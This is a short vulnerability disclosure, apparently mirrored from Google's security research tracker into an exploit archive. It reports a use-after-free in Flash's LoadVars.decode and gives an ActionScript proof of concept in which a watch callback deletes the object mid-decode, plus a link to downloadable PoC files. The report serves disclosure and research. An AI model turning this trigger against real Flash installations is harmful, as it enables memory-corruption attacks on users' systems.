@@ -1,0 +1,28 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=667
+
+There is a use-after-free in LoadVars.decode. If a watch is set on the object that the parameters are being decoded into, and the watch deletes the object, then other methods are called on the deleted object after it is freed. A PoC is as follows:
+
+var lv = new LoadVars();
+var f = lv.decode;
+var tf = this.createTextField("tf",1, 2, 3, 4, 5);
+tf.natalie = "not test";
+tf.watch("natalie", func);
+f.call(tf, "natalie=test&bob=1");
+trace(tf.natalie);
+
+
+function func(){
+	
+	trace("here");
+	tf.removeTextField();	
+	return "test";
+
+	}
+	
+
+A sample swf and fla are attached. This issue was reproduced in Chrome on 64-bit Ubuntu.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39463.zip
+
